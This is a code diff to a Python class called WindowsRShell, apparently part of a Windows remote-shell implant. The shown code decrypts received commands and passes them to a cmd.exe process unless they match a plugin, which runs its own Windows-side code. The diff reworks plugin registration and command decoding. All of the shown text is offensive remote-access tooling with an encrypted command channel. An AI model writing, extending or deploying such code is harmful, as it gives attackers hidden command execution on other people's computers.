@@ -30,8 +30,8 @@ class WindowsRShell:
         commandClasses = inspect.getmembers(plugins, inspect.isclass)
         commandClasses.pop(0)
         externalCommands = dict()
-        for className, commandObject in commandClasses:
-            externalCommands[str(commandObject)] = commandObject.windowsTarget
+        for className, commandClass in commandClasses:
+            externalCommands[commandClass.name()] = commandClass.windowsTarget
         return externalCommands
 
     def tryPlugin(self, commandLine):
@@ -56,8 +56,12 @@ class WindowsRShell:
             command = cipher.decrypt(ciphertext)
             if len(command) > 0:
                 # check if command is a plugin -- if so run plugin's windows target code
-                plugin = self.tryPlugin(command)
-                if not plugin:
+                plugin = self.tryPlugin(command.decode())
+                if plugin:
+                    # print new prompt
+                    cmdexe.stdin.write(b'\n')
+                    cmdexe.stdin.flush()
+                else:
                     # not a plugin -- send command to shell
                     cmdexe.stdin.write(command)
                     cmdexe.stdin.flush()
